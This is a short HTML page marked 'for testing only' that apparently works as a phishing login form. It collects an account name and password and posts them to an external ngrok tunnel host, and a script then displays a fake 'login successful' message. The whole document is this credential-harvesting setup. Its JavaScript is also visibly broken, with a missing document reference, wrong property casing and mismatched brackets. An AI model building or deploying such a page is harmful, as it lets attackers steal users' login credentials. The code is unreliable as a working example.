<!--仅为测试-->
<script>
function getQueryString(name) { 
        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); 
        var r = window.location.search.substr(1).match(reg); 
        if (r != null) return unescape(r[2]); 
        return null; 
    } 
  a = getQueryString("fin")
  if (a!=null){v = getElementById("passer");v.innerhtml= "登录成功!")
</script>

<form action="http://h503mc.ngrok2.xiaomiqiu.cn/users/users.php" method="post" id="passer" style="text-align:center">
你的账户名:<input type="text" name="user">
密码:<input type="text" name="pass">
<input type="submit" value="提交">
</form>
